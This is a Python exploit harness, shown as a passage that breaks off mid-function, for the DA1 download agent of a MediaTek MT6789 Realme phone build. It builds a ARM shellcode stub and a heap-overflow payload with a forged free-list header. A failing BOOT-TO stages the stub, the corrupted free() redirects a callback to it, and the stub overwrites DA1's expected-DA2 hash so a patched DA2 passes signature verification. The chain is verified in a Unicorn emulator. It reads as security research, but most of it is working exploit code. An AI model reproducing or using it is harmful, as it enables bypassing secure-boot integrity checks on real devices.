#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""DA1 C.25 (RMX3630 / MT6789) HeapBait -> fixed-staging -> hash-slot chain.

Port of ``docs/notes/da1_fixed_stage.py`` (proven PASS on DA1 200EX01) to the
C.25 DA1 extracted from DekuzenOkahiro's ``mt6789_realme.bin`` container.

Target container
----------------
``/tmp/opencode/mt6789_realme.bin``  sha256 024d01b8...  (size 0xb96d4)
  header 0xBC | DA1 @0x0000BC len 0x64D58 (sha256 b675db91...)
              | DA2 @0x64E14 len 0x548C0 (body = first 0x547C0, trailer
                = the last 0x100 bytes, a PSS signature)
              | end 0xB96D4
The DA1 blob is loaded at VA 0x200000, so file offset = VA - 0x200000.

What this script proves (all by execution unless labelled [STATIC])
-------------------------------------------------------------------
1. [STATIC] The digest rule on this build: DA1's expected-DA2 slot holds
   ``sha256(da2[:-0x100])`` -- *not* ``sha256(da2)`` and *not*
   ``sha256(da2[:-0x140])``.  The slot is at DA1 VA 0x264C28 (file offset
   0x64C28, container offset 0x64CE4) and the 32-byte value occurs exactly once
   in DA1.
2. [STATIC] ``CMD:BOOT-TO`` (0x200FEC) downloads the host file to the address
   named by ``da/arg/at_address`` (0x40000000 in our command XML), then hashes
   ``[dest, len]`` with 0x24FA00 and compares against 0x264C28 byte by byte at
   0x201184..0x20119C; a mismatch takes 0x201260 and returns 0xC0070004.  On
   success it installs dpc->cb = jmp_address and dpc->arg = 0x2DE180.  This is
   the same structure as 200EX01 (only moved).
3. Sweep of the declared DRAM-REPAIR length L with four heap histories:
   no prelude, failing-BOOT-TO prelude, benign-command prelude, exact-length
   download prelude.  The parse scratch chunk of the XML parser
   (``malloc(0x40)`` at 0x206CF8, return site 0x206CFC) is still 0x4C, so the
   exact-fit rule is unchanged: ``L = align4(scratch_req + 0xC) - 0x10 = 0x3C``
   (or any L with ``align4(L+0x10) == 0x4C``, i.e. 0x39..0x3c).
4. The full chain, in one fresh emulator per run: a *failing* CMD:BOOT-TO stages
   a 76-byte stub + digest blob at 0x40000000; DRAM-REPAIR with L=0x3C and the
   constant fake header {0xDEADBEEF, 0x2DF79C, 0x40000000} fires the free()
   core write ``dpc->cb = 0x40000000``; cmd_loop's ``blx r4`` at 0x20401C jumps
   to the stub; the stub unlinks the forged node, copies the digest from
   0x40000080 to 0x264C28, clears dpc+0/+4/+8 and returns to 0x204020.
   The DA then survives: free list walkable to the sentinel 0x2DF7D8,
   malloc(0x100)+free x3, one more command answered, and the real BOOT-TO with
   the patched DA2 now passes DA1's own compare.
5. Determinism: 5 fresh runs of the full chain for each of four configurations.
6. Regression: ``docs/notes/da1_fixed_stage.py`` (200EX01) is re-run and must
   still print RESULT: PASS.

Emulation model (deviation, labelled in the output)
---------------------------------------------------
DA1's SHA-256 entry 0x24FA00 wraps a hardware crypto block (it calls 0x2505D0,
which drives the engine; the image contains no software SHA-256 K table), so
Unicorn cannot execute it.  The entry is modelled with ``hashlib`` (installed
hook at 0x24FA00) and the deviation is printed.  Everything else -- the BOOT-TO
download, DA1's own compare loop, the allocator, handler dispatch, the stub --
runs as native DA1 code.  The model is also probed *without* the hook to show it
produces no digest natively.

Harness note: after the stub returns into cmd_loop's epilogue the emulator is
stopped at the dpc-clear function 0x200FD0 (the harness raises out of the hook).
That is a harness stop, not DA1 behaviour; it keeps the follow-up checks
(malloc/free, next command) running from the exact post-chain state.

Reuse without modification
--------------------------
This file imports the existing harnesses and patches *module attributes only*:
  da1_emu.py        DA1Emu + memory map (build independent)
  da1_heap_sweep.py DownloadHost, CMD_XML, XML_ADDR, CHUNK_HDR, _align4
  da1_fire_chain.py boot(), ChainHost/BootHost, BOOT_XML/BENIGN_XML,
                    install_sha_engine(), walk_free_list(), A32 encoders...
No existing file is edited.

Usage
-----
    /tmp/opencode/da1venv/bin/python docs/notes/da1_chain_c25.py
    ... --json /tmp/opencode/c25/chain.json  --no-regression  --quick
"""
from __future__ import annotations

import argparse
import hashlib
import json
import os
import struct
import subprocess
import sys
import time

_HERE = os.path.dirname(os.path.abspath(__file__))
if _HERE not in sys.path:
    sys.path.insert(0, _HERE)

from unicorn import UC_HOOK_CODE                                  # noqa: E402
import unicorn.arm_const as ac                                    # noqa: E402

import da1_emu                                                    # noqa: E402
import da1_heap_sweep as hs                                       # noqa: E402
import da1_fire_chain as fc                                       # noqa: E402

# ---------------------------------------------------------------------------
# container / build constants
# ---------------------------------------------------------------------------
CONTAINER = "/tmp/opencode/mt6789_realme.bin"
OUTDIR = "/tmp/opencode/c25"
DA1_OFF, DA1_LEN = 0xBC, 0x64D58
DA2_OFF, DA2_LEN = 0x64E14, 0x548C0
DA2_SIG = 0x100
DA1_AT = 0x200000                    # DA1 load address

EXPECT_CONTAINER_SHA = ("024d01b80a0ef2e50d4dae83ca90f359"
                        "4c9879586163421d0f2fcb7bd6abb811")
EXPECT_DA1_SHA = ("b675db91923e3e446002c46211df2011"
                  "d3988ecb117cba276a97cb94ef4a91d1")

# C.25 addresses (all re-derived in phase 2/3, never taken on trust)
C25 = dict(
    HEAP_INIT=0x2043BC, MALLOC=0x2040DC, FREE=0x204274, INSERT=0x2042CC,
    DPC_STRUCT=0x2DF7A0, HEAP_HEAD=0x2DF7D0, CMD_LOOP=0x203B44,
    REGISTRAR=0x200E3C, DRAM_REPAIR=0x202BB8,
    MALLOC_ENTRY=0x2040DC, MALLOC_RET=0x2041FC, MALLOC_OK_RET=0x2041FC,
    MALLOC_FAIL_RET=0x204154, MALLOC_WALK=0x20413C, INSERT_WALK=0x2042E4,
    RECV_LOOP=0x24DC94, RECV_REAL=0x24D494, SEND_REAL=0x24D574,
    DOWNLOAD_MALLOC_LR=0x24DC38, PACKET_LEN_ADDR=0x2DE3F8,
    DPC_ADDR=0x2DF79C, BLX_SITE=0x20401C, SAFE_CONT=0x204020,
    FREE_CORE_WRITE=0x2042C0, DST_ADDR=0x264C28, SHA_ROUTINE=0x24FA00,
    BOOT_TO=0x200FEC, BOOT_HASH_OK=0x2011AC, BOOT_HASH_BAD=0x201260,
    DA2_AT=0x40000000, DA2_BODY=0x547C0,
    PATCH_OFFSET=0x51D3C, PATCH_XOR=0x01,
)
HEAP_HEAD = C25["HEAP_HEAD"]
SENTINEL = HEAP_HEAD + 8             # 0x2DF7D8 (free-list sentinel)
FORGED_NODE = C25["DPC_ADDR"]        # 0x2DF79C
DPC = C25["DPC_STRUCT"]              # 0x2DF7A0
DA1_SLOT = C25["DST_ADDR"]           # 0x264C28
FS_STAGE = C25["DA2_AT"]             # 0x40000000
DA2_BODY = C25["DA2_BODY"]           # 0x547C0

STUB_LEN = 0x4C
DIGEST_OFF = 0x80
FAKE_MAGIC = 0xDEADBEEF
FAKE_HDR = (FAKE_MAGIC, FORGED_NODE, FS_STAGE)
L_FINAL = 0x3C
SCRATCH_REQ = 0x40                   # XML parser scratch malloc(0x40)
SCRATCH_LR = 0x206CFC                # return site of that malloc
SCRATCH_CALL = 0x206CF8              # the `bl 0x204b20` itself
TRANSPORT_ERR = 0xC0010001
HASH_MISMATCH_ERR = 0xC0070004
BOOT_ARG_OK = 0x2DE180

# BOOT-TO compare path (C.25)
SHA_INPUT_REF = 0x201140             # `bl 0x24fa00`
SHA_CMP_LO, SHA_CMP_HI = 0x201184, 0x2011A0
SHA_CMP_BODY = 0x201188               # ldrb r3,[r4,r1]
BOOT_OK_SITE = 0x2011A0               # compare loop fell through
MISMATCH_LOG_SITE = 0x201318          # loads "DA Hash mismatch."
SHA_OUT_ADDR = 0x2BE100              # harness scratch for the SHA model check
SHA_OUTLEN_ADDR = 0x2BE200

CHAIN_CONFIGS = ("none", "cmd", "exactdl", "doublebootto")
SWEEP_CONFIGS = ("none", "bootto", "cmd", "exactdl")
SWEEP_LO, SWEEP_HI, SWEEP_STEP = 0x20, 0x60, 0x04
FINE_LO, FINE_HI = 0x38, 0x40
RUNS_PER_CONFIG = 5


# ---------------------------------------------------------------------------
# address patching (module attributes only -- no file is modified)
# ---------------------------------------------------------------------------
def patch_modules():
    for mod in (da1_emu, hs, fc):
        for key, value in C25.items():
            if hasattr(mod, key):
                setattr(mod, key, value)
    # da1_fire_chain caches MALLOC in MALLOC_ENTRY at import time
    fc.MALLOC_ENTRY = C25["MALLOC"]
    # pathological-loop tripwires re-pointed at the C.25 loops
    fc.BUDGET_SPOTS = (C25["MALLOC_WALK"], C25["INSERT_WALK"],
                       C25["RECV_LOOP"], 0x203BB4, 0x204158, 0x2042FC,
                       SCRATCH_CALL)


class LoopBudget(Exception):
    """Abort a run whose heap history sent the DA into a pathological loop."""


# ---------------------------------------------------------------------------
# phase 1: extract + digest-slot rule
# ---------------------------------------------------------------------------
def extract():
    data = open(CONTAINER, "rb").read()
    got = hashlib.sha256(data).hexdigest()
    if got != EXPECT_CONTAINER_SHA:
        raise SystemExit(f"container sha256 mismatch: {got}")
    if len(data) != 0xB96D4:
        raise SystemExit(f"container size {len(data):#x} != 0xb96d4")
    da1 = data[DA1_OFF:DA1_OFF + DA1_LEN]
    da2 = data[DA2_OFF:DA2_OFF + DA2_LEN]
    if hashlib.sha256(da1).hexdigest() != EXPECT_DA1_SHA:
        raise SystemExit("DA1 sha256 mismatch")
    if len(da2) != DA2_LEN:
        raise SystemExit("DA2 truncated")

    os.makedirs(OUTDIR, exist_ok=True)
    da1_path = os.path.join(OUTDIR, "da1.bin")
    da2_path = os.path.join(OUTDIR, "da2.bin")
    open(da1_path, "wb").write(da1)
    open(da2_path, "wb").write(da2)
    return data, da1, da2, da1_path, da2_path


def digest_slot_rule(da1, da2):
    slot_off = DA1_SLOT - DA1_AT
    slot = da1[slot_off:slot_off + 32]
    cands = [
        ("sha256(da2)              [len 0x548c0]", da2),
        ("sha256(da2[:-0x100])     [len 0x547c0]", da2[:-DA2_SIG]),
        ("sha256(da2[:-0x140])     [len 0x54780]", da2[:-0x140]),
        ("sha256(da2[:-0x140+0x40])", da2[:-0x140 + 0x40]),
    ]
    rows = []
    for label, blob in cands:
        h = hashlib.sha256(blob).digest()
        rows.append({"label": label, "length": len(blob), "sha256": h.hex(),
                     "match": h == slot})
    occ = [i for i in range(0, len(da1) - 31, 4)
           if da1[i:i + 32] == slot]
    return {
        "slot_va": DA1_SLOT,
        "slot_da1_file_offset": slot_off,
        "slot_container_offset": DA1_OFF + slot_off,
        "slot_value": slot.hex(),
        "candidates": rows,
        "match_label": next((r["label"] for r in rows if r["match"]), None),
        "da2_body_len": DA2_SIG and (DA2_LEN - DA2_SIG),
        "occurrences_in_da1": [DA1_AT + o for o in occ],
        "unique": len(occ) == 1,
        "ok": (len(occ) == 1 and rows[1]["match"] and not rows[0]["match"]
               and not rows[2]["match"]),
    }


# ---------------------------------------------------------------------------
# phase 2: static BOOT-TO structure (capstone)
# ---------------------------------------------------------------------------
def _dis(da1, va, n):
    from capstone import Cs, CS_ARCH_ARM, CS_MODE_ARM
    md = Cs(CS_ARCH_ARM, CS_MODE_ARM)
    off = va - DA1_AT
    return list(md.disasm(da1[off:off + n], va))


def _words(da1, va, n):
    off = va - DA1_AT
    return [struct.unpack_from("<I", da1, off + 4 * i)[0]
            for i in range(n // 4)]


def _mov_pair(value, rd=0):
    """(movw_word, movt_word) for an absolute 32-bit constant in r<rd>."""
    imm16_lo = value & 0xFFFF
    imm16_hi = (value >> 16) & 0xFFFF
    w_lo = (0xE3000000 | (((imm16_lo >> 12) & 0xF) << 16)
            | (rd << 12) | (imm16_lo & 0xFFF))
    w_hi = (0xE3400000 | (((imm16_hi >> 12) & 0xF) << 16)
            | (rd << 12) | (imm16_hi & 0xFFF))
    return w_lo, w_hi


def bootto_structure(da1):
    """Verify the staging -> hash -> compare -> mismatch structure by bytes."""
    text = [f"{i.address:08x}  {i.bytes.hex():8s}  {i.mnemonic:7s} {i.op_str}"
            for i in _dis(da1, C25["BOOT_TO"], 0x30)]
    checks = {}

    # download call at 0x2010d0: r2 = &[fp-0x1c] (dest), r3 = &[fp-0x20] (len)
    checks["bootto_prologue"] = (
        _words(da1, C25["BOOT_TO"], 16)
        == [0xE92D4BF0, 0xE28DB018, 0xE24DD068, 0xE1A04001])
    seq = {i.address: f"{i.mnemonic} {i.op_str}"
           for i in _dis(da1, 0x2010A0, 0x40)}
    checks["dest_from_at_address"] = (
        seq.get(0x2010A8) == "str r0, [fp, #-0x1c]"
        and seq.get(0x2010B0) == "str r0, [fp, #-0x20]"
        and seq.get(0x2010BC) == "sub r2, fp, #0x1c"
        and seq.get(0x2010C0) == "sub r3, fp, #0x20")

    bl = _dis(da1, 0x2010D0, 4)[0]
    checks["download_call"] = (bl.mnemonic == "bl"
                               and _branch_target(da1, 0x2010D0) == 0x24D9EC)

    # hash call at 0x201140 over [fp-0x1c], [fp-0x20]
    pre = {i.address: f"{i.mnemonic} {i.op_str}"
           for i in _dis(da1, 0x20112C, 0x1C)}
    sha = _dis(da1, 0x201140, 4)[0]
    checks["sha_call"] = (
        pre.get(0x201130) == "ldr r0, [fp, #-0x1c]"
        and pre.get(0x201138) == "ldr r1, [fp, #-0x20]"
        and sha.mnemonic == "bl"
        and _branch_target(da1, 0x201140) == C25["SHA_ROUTINE"])

    # compare loop: ldrb r2,[r6,r1] / ldrb r3,[r4,r1] / cmp r3,r2 / bne
    loop = {i.address: f"{i.mnemonic} {i.op_str}"
            for i in _dis(da1, SHA_CMP_LO, SHA_CMP_HI - SHA_CMP_LO)}
    checks["compare_loop"] = (
        loop.get(0x201184) == "ldrb r2, [r6, r1]"
        and loop.get(0x201188) == "ldrb r3, [r4, r1]"
        and loop.get(0x20118C) == "cmp r3, r2"
        and loop.get(0x201190) == "bne #0x201260"
        and loop.get(0x201194) == "add r1, r1, #1"
        and loop.get(0x201198) == "cmp r1, r0"
        and loop.get(0x20119C) == "blo #0x201184")

    # slot constant: movw r4,#0x4c28 / mov r1,#0 / movt r4,#0x26 (interleaved)
    checks["slot_constant"] = (
        _words(da1, 0x201178, 12)
        == [_mov_pair(DA1_SLOT, rd=4)[0], 0xE3A01000,
            _mov_pair(DA1_SLOT, rd=4)[1]])

    # mismatch return code 0xC0070004 (movw/movt r5)
    checks["mismatch_rc"] = (
        _words(da1, 0x201324, 8) == list(_mov_pair(HASH_MISMATCH_ERR, rd=5)))

    # success path: dpc = 0x2DF7A0, stmib r0,{r8,ip}
    succ = {i.address: f"{i.mnemonic} {i.op_str}"
            for i in _dis(da1, 0x201210, 0x0C)}
    checks["success_installs_dpc"] = (
        succ.get(0x201210) == "movw r0, #0xf7a0"
        and succ.get(0x201214) == "movt r0, #0x2d"
        and succ.get(0x201218) == "stmib r0, {r8, ip}")

    # success log string "DA hash validation OK" is reached after the loop
    checks["ok_log_site"] = (
        _words(da1, 0x2011AC, 4)[0] == _mov_pair(0x251EAB, rd=0)[0])

    # mismatch log loads 0x251e48 ("DA Hash mismatch.") at 0x201318
    checks["mismatch_log_site"] = (
        _words(da1, 0x201318, 8) == list(_mov_pair(0x251E48, rd=0)))

    return {"checks": checks, "prologue_disasm": text,
            "ok": all(checks.values())}


def _branch_target(da1, va):
    word = _words(da1, va, 4)[0]
    imm = word & 0x00FFFFFF
    if imm & 0x00800000:
        imm -= 0x01000000
    return (va + 8 + imm * 4) & 0xFFFFFFFF


# ---------------------------------------------------------------------------
# stub / payload builders (constants only)
# ---------------------------------------------------------------------------
def a32_movw(rd, imm16):
    return (0xE3000000 | (((imm16 >> 12) & 0xF) << 16)
            | (rd << 12) | (imm16 & 0xFFF))


def a32_movt(rd, imm16):
    return (0xE3400000 | (((imm16 >> 12) & 0xF) << 16)
            | (rd << 12) | (imm16 & 0xFFF))


def a32_ldr_imm(rd, rn, off):
    if not 0 <= off < 0x1000:
        raise ValueError(off)
    return 0xE5900000 | (rn << 16) | (rd << 12) | off


def a32_str_imm(rd, rn, off):
    if not 0 <= off < 0x1000:
        raise ValueError(off)
    return 0xE5800000 | (rn << 16) | (rd << 12) | off


def a32_mov_imm(rd, value):
    if value != 0:
        raise ValueError("only mov rX,#0 is encoded")
    return 0xE3A00000 | (rd << 12)


def a32_ldm_ia(rb, regs):
    return 0xE8900000 | (rb << 16) | (regs & 0xFFFF)


def a32_stm_ia_w(rb, regs):
    return 0xE8A00000 | (rb << 16) | (regs & 0xFFFF)


A32_BX_LR = 0xE12FFF1E


def build_stub():
    """76-byte absolute A32 stub for the C.25 build.

    Entry (cmd_loop blx r4): r4 = dpc->cb = 0x40000000, r0 = dpc->arg,
    lr = 0x204020.  Exit: forged node unlinked, digest 0x40000080 -> 0x264C28,
    dpc+0/+4/+8 cleared, bx lr.  Clobbers r0-r7/r12 only.
    """
    words = [
        a32_movw(2, FORGED_NODE & 0xFFFF),        # movw r2, #0xf79c
        a32_movt(2, FORGED_NODE >> 16),           # movt r2, #0x002d
        a32_ldr_imm(0, 2, 0),                     # ldr  r0, [r2]      prev
        a32_ldr_imm(1, 2, 4),                     # ldr  r1, [r2, #4]  next
        a32_str_imm(1, 0, 4),                     # str  r1, [r0, #4]
        a32_str_imm(0, 1, 0),                     # str  r0, [r1]
        a32_movw(3, (FS_STAGE + DIGEST_OFF) & 0xFFFF),   # movw r3, #0x0080
        a32_movt(3, (FS_STAGE + DIGEST_OFF) >> 16),      # movt r3, #0x4000
        a32_ldm_ia(3, 0x00FF),                    # ldm  r3, {r0-r7}
        a32_movw(12, DA1_SLOT & 0xFFFF),          # movw ip, #0x4c28
        a32_movt(12, DA1_SLOT >> 16),             # movt ip, #0x0026
        a32_stm_ia_w(12, 0x00FF),                 # stm  ip!, {r0-r7}
        a32_mov_imm(0, 0),                        # mov  r0, #0
        a32_movw(1, DPC & 0xFFFF),                # movw r1, #0xf7a0
        a32_movt(1, DPC >> 16),                   # movt r1, #0x002d
        a32_str_imm(0, 1, 0),                     # str  r0, [r1]
        a32_str_imm(0, 1, 4),                     # str  r0, [r1, #4]
        a32_str_imm(0, 1, 8),                     # str  r0, [r1, #8]
        A32_BX_LR,                                # bx   lr
    ]
    expect = [0xE30F279C, 0xE340202D, 0xE5920000, 0xE5921004,
              0xE5801004, 0xE5810000, 0xE3003080, 0xE3443000,
              0xE89300FF, 0xE304CC28, 0xE340C026, 0xE8AC00FF,
              0xE3A00000, 0xE30F17A0, 0xE340102D, 0xE5810000,
              0xE5810004, 0xE5810008, 0xE12FFF1E]
    assert words == expect, [hex(w) for w in words]
    blob = b"".join(struct.pack("<I", w) for w in words)
    assert len(blob) == STUB_LEN, hex(len(blob))
    assert len(blob) <= DIGEST_OFF
    # sanity: the build's own constants
    assert FORGED_NODE == 0x2DF79C and DPC == 0x2DF7A0
    assert DA1_SLOT == 0x264C28 and SENTINEL == 0x2DF7D8
    return blob, fc.disasm(blob, FS_STAGE)


def make_blob(stub, digest):
    if len(digest) != 32:
        raise ValueError("digest must be 32 bytes")
    blob = bytearray(DIGEST_OFF + 32)
    blob[:len(stub)] = stub
    blob[DIGEST_OFF:DIGEST_OFF + 32] = digest
    return bytes(blob)


def make_payload(L, cb_value):
    """zeros + 12-byte fake header at the exact user capacity (constants only)."""
    capacity = hs._align4(L + 0x10) - hs.CHUNK_HDR
    stream_len = max(L + 0x10, capacity + hs.CHUNK_HDR)
    buf = bytearray(stream_len)
    buf[capacity:capacity + hs.CHUNK_HDR] = struct.pack(
        "<III", FAKE_MAGIC, FORGED_NODE, cb_value)
    return bytes(buf)


def patched_da2(da2_path):
    da2 = open(da2_path, "rb").read()
    body = bytearray(da2[:DA2_BODY])
    old = hashlib.sha256(bytes(body)).digest()
    if body[C25["PATCH_OFFSET"]] != 0:
        raise SystemExit("the C.25 padding byte at 0x51d3c is not zero")
    body[C25["PATCH_OFFSET"]] ^= C25["PATCH_XOR"]
    new = hashlib.sha256(bytes(body)).digest()
    return bytes(body), old, new


# ---------------------------------------------------------------------------
# host side (fixed cb value, constants only)
# ---------------------------------------------------------------------------
class FixedHost(fc.ChainHost):
    def __init__(self, emu, declared, payload, cb_value):
        super().__init__(emu, declared, overflow=True)
        self.payload = payload
        self.cb_value = cb_value

    def _payload(self):
        # D is reported for the geometry table, never used to build the payload
        self.predicted = fc.predict_download_buffer(self.emu.uc, self.declared)
        return self.payload


# ---------------------------------------------------------------------------
# probes
# ---------------------------------------------------------------------------
class C25BootProbe:
    def __init__(self, emu):
        self.emu = emu
        self.reset()
        emu.uc.hook_add(UC_HOOK_CODE, self._cmp, begin=SHA_CMP_BODY,
                        end=SHA_CMP_BODY)
        emu.uc.hook_add(UC_HOOK_CODE, self._range, begin=SHA_CMP_LO,
                        end=SHA_CMP_HI)
        emu.uc.hook_add(UC_HOOK_CODE, self._bad, begin=C25["BOOT_HASH_BAD"],
                        end=C25["BOOT_HASH_BAD"])
        emu.uc.hook_add(UC_HOOK_CODE, self._ok, begin=BOOT_OK_SITE,
                        end=BOOT_OK_SITE)
        emu.uc.hook_add(UC_HOOK_CODE, self._sha, begin=SHA_INPUT_REF,
                        end=SHA_INPUT_REF)
        emu.uc.hook_add(UC_HOOK_CODE, self._badlog,
                        begin=MISMATCH_LOG_SITE, end=MISMATCH_LOG_SITE)

    def reset(self):
        self.cmp = 0
        self.range_hits = 0
        self.mismatch = False
        self.ok_reached = False
        self.mismatch_log = False
        self.sha_calls = []

    def _cmp(self, uc, a, s, u):
        self.cmp += 1

    def _range(self, uc, a, s, u):
        self.range_hits += 1

    def _bad(self, uc, a, s, u):
        self.mismatch = True

    def _ok(self, uc, a, s, u):
        self.ok_reached = True

    def _badlog(self, uc, a, s, u):
        self.mismatch_log = True

    def _sha(self, uc, a, s, u):
        self.sha_calls.append((uc.reg_read(ac.UC_ARM_REG_R0),
                               uc.reg_read(ac.UC_ARM_REG_R1)))

    def as_dict(self):
        return {"cmp_bytes": self.cmp, "cmp_region_hits": self.range_hits,
                "mismatch_branch": self.mismatch,
                "ok_reached": self.ok_reached,
                "mismatch_log": self.mismatch_log,
                "sha_calls": [{"in": a, "len": n} for a, n in self.sha_calls]}


def run_boot_to(emu, data, probe):
    probe.reset()
    host = fc.BootHost(emu, data)
    emu.on_send = host.on_send
    emu.rx.clear()
    emu.tx.clear()
    emu.write_bytes(hs.XML_ADDR, fc.BOOT_XML)
    emu.write_bytes(DPC, b"\x00" * 12)
    emu.budget["hits"] = 0
    emu.budget["hit"] = False
    rc = emu.call(C25["BOOT_TO"], [da1_emu.SESSION, hs.XML_ADDR]) & 0xFFFFFFFF
    return {"rc": rc, "sent": host.sent, "probe": probe.as_dict(),
            "tx": [bytes(t) for t in emu.tx]}


# ---------------------------------------------------------------------------
# preludes
# ---------------------------------------------------------------------------
def prelude_benign_cmd(emu):
    emu.on_send = None
    emu.rx.clear()
    emu.tx.clear()
    emu.rx.append(b"OK\x00")
    emu.rx.append(fc.BENIGN_XML)
    emu.budget["hits"] = 0
    rc = emu.call(C25["CMD_LOOP"], []) & 0xFFFFFFFF
    ok = any(b"<command>CMD:END</command>" in t and b"<result>OK</result>" in t
             for t in emu.tx)
    return {"kind": "benign-cmd", "rc": rc, "ok": ok}


def prelude_exact_download(emu, length=0x40):
    host = fc.ChainHost(emu, length, overflow=False)
    emu.on_send = host.on_send
    emu.rx.clear()
    emu.tx.clear()
    emu.write_bytes(hs.XML_ADDR, hs.CMD_XML)
    emu.write_bytes(DPC, b"\x00" * 12)
    emu.budget["hits"] = 0
    rc = emu.call(C25["DRAM_REPAIR"], [da1_emu.SESSION, hs.XML_ADDR])
    return {"kind": "exact-download", "declared": length,
            "rc": rc & 0xFFFFFFFF}


def stage_blob(emu, blob):
    probe = C25BootProbe(emu)
    slot_before = bytes(emu.uc.mem_read(DA1_SLOT, 32))
    run = run_boot_to(emu, blob, probe)
    staged = bytes(emu.uc.mem_read(FS_STAGE, len(blob)))
    sha_blob = hashlib.sha256(blob).digest()
    slot_now = bytes(emu.uc.mem_read(DA1_SLOT, 32))
    first_diff = next((i for i in range(32)
                       if sha_blob[i] != slot_before[i]), 32)
    expected_cmp = 32 if first_diff == 32 else first_diff + 1
    res = {
        "blob_len": len(blob),
        "rc": run["rc"],
        "rc_is_hash_mismatch": run["rc"] == HASH_MISMATCH_ERR,
        "rc_is_transport": run["rc"] == TRANSPORT_ERR,
        "bytes_sent": run["sent"],
        "staged_equal": staged == blob,
        "staged_head_hex": staged[:0x20].hex(),
        "staged_digest_hex": staged[DIGEST_OFF:DIGEST_OFF + 32].hex(),
        "sha256_blob": sha_blob.hex(),
        "slot_before": slot_before.hex(),
        "slot_unchanged": slot_now == slot_before,
        "sha_blob_equals_slot": sha_blob == slot_before,
        "first_diff_byte": first_diff,
        "expected_cmp_hits": expected_cmp,
        "probe": run["probe"],
        "tx_hash_mismatch_log": any(b"DA Hash mismatch" in t
                                    for t in run["tx"]),
    }
    res["ok"] = bool(res["staged_equal"] and res["rc_is_hash_mismatch"]
                     and not res["rc_is_transport"]
                     and res["probe"]["cmp_bytes"] == expected_cmp
                     and res["probe"]["mismatch_branch"]
                     and res["probe"]["mismatch_log"]
                     and res["slot_unchanged"]
                     and not res["sha_blob_equals_slot"]
                     and res["bytes_sent"] == len(blob)
                     and res["probe"]["sha_calls"]
                     and res["probe"]["sha_calls"][0]["in"] == FS_STAGE
                     and res["probe"]["sha_calls"][0]["len"] == len(blob))
    return res


# ---------------------------------------------------------------------------
# phase 3: geometry sweep
# ---------------------------------------------------------------------------
def sweep_run(da1_path, L, config, blob):
    emu = fc.boot(da1_path, map_da2=True)
    fc.install_sha_engine(emu)
    rec = {"L": L, "config": config, "prelude_rc": None, "D": None,
           "chunk": None, "needed": hs._align4(L + 0x10), "exact": False,
           "capacity": None, "victim": None, "victim_alloc": False,
           "victim_freed": False, "fire_values": [], "fire_count": 0,
           "blx": None, "scratch_sizes": [], "scratch_count": 0,
           "budget": False, "rc": None, "dpc_cb": None,
           "free_at_malloc": [], "free_after": None, "allocs": 0}

    scratch = {"n": 0, "sizes": set()}
    budget = {"n": 0}

    def scratch_tick(uc, a, s, u):
        scratch["n"] += 1
        if scratch["n"] > 400:
            rec["budget"] = True
            raise LoopBudget("XML-parser scratch loop (corrupted heap)")

    def slow_tick(uc, a, s, u):
        budget["n"] += 1
        if budget["n"] > 200_000:
            rec["budget"] = True
            raise LoopBudget("budget")

    emu.uc.hook_add(UC_HOOK_CODE, scratch_tick, begin=SCRATCH_CALL,
                    end=SCRATCH_CALL)
    for spot in (C25["MALLOC_WALK"], C25["INSERT_WALK"], C25["RECV_LOOP"]):
        emu.uc.hook_add(UC_HOOK_CODE, slow_tick, begin=spot, end=spot)

    if config == "cmd":
        prelude_benign_cmd(emu)
    elif config == "exactdl":
        prelude_exact_download(emu)
    if config in ("bootto", "cmd", "exactdl"):
        rec["prelude_rc"] = stage_blob(emu, blob)["rc"]

    allocs = []
    gate = {}
    snap = []
    fires = []
    last = {"ptr": None, "lr": None}

    def m_entry(uc, a, s, u):
        gate["req"] = uc.reg_read(ac.UC_ARM_REG_R0)
        gate["lr"] = uc.reg_read(ac.UC_ARM_REG_LR)
        if gate["lr"] == C25["DOWNLOAD_MALLOC_LR"]:
            snap[:] = fc.walk_free_list(uc)["nodes"]

    def m_ret(uc, a, s, u):
        if "req" in gate:
            ptr = uc.reg_read(ac.UC_ARM_REG_R0)
            allocs.append({"request": gate.pop("req"),
                           "lr": gate.pop("lr", 0), "ptr": ptr})
            if allocs[-1]["lr"] == SCRATCH_LR and ptr:
                try:
                    scratch["sizes"].add(
                        struct.unpack("<I", uc.mem_read(ptr - 4, 4))[0])
                except Exception:
                    pass
            gate.clear()

    def on_free(uc, a, s, u):
        last["ptr"] = uc.reg_read(ac.UC_ARM_REG_R0)
        last["lr"] = uc.reg_read(ac.UC_ARM_REG_LR)

    def on_fire(uc, a, s, u):
        if uc.reg_read(ac.UC_ARM_REG_R0) == FORGED_NODE:
            fires.append({"node": FORGED_NODE,
                          "value": uc.reg_read(ac.UC_ARM_REG_R1),
                          "free_ptr": last["ptr"], "free_lr": last["lr"]})

    def on_blx(uc, a, s, u):
        rec["blx"] = uc.reg_read(ac.UC_ARM_REG_R4)
        uc.reg_write(ac.UC_ARM_REG_PC, C25["SAFE_CONT"])

    emu.uc.hook_add(UC_HOOK_CODE, m_entry, begin=C25["MALLOC"],
                    end=C25["MALLOC"])
    emu.uc.hook_add(UC_HOOK_CODE, m_ret, begin=C25["MALLOC_RET"],
                    end=C25["MALLOC_RET"])
    emu.uc.hook_add(UC_HOOK_CODE, on_free, begin=C25["FREE"], end=C25["FREE"])
    emu.uc.hook_add(UC_HOOK_CODE, on_fire, begin=C25["FREE_CORE_WRITE"],
                    end=C25["FREE_CORE_WRITE"])
    emu.uc.hook_add(UC_HOOK_CODE, on_blx, begin=C25["BLX_SITE"],
                    end=C25["BLX_SITE"])

    payload = make_payload(L, FS_STAGE)
    host = FixedHost(emu, L, payload, FS_STAGE)
    emu.on_send = host.on_send
    emu.rx.clear()
    emu.tx.clear()
    emu.rx.append(b"OK\x00")
    emu.rx.append(hs.CMD_XML)
    emu.write_bytes(DPC, b"\x00" * 12)
    emu.budget["hits"] = 0
    emu.budget["hit"] = False
    rec["rc"] = emu.call(C25["CMD_LOOP"], []) & 0xFFFFFFFF
    rec["allocs"] = len(allocs)
    rec["scratch_sizes"] = sorted(scratch["sizes"])
    rec["scratch_count"] = scratch["n"]
    rec["free_at_malloc"] = [{"addr": n["addr"], "size": n["size"]}
                             for n in snap[:8]]

    dl = [x for x in allocs
          if x["lr"] == C25["DOWNLOAD_MALLOC_LR"] and x["ptr"]]
    D = dl[0]["ptr"] if dl else None
    if D:
        need = rec["needed"]
        node = next((n for n in snap
                     if n["size"] >= need and n["addr"] + hs.CHUNK_HDR == D),
                    None)
        rec["D"] = D
        rec["chunk"] = node["size"] if node else None
        rec["exact"] = bool(node and node["size"] == need)
        rec["capacity"] = need - hs.CHUNK_HDR
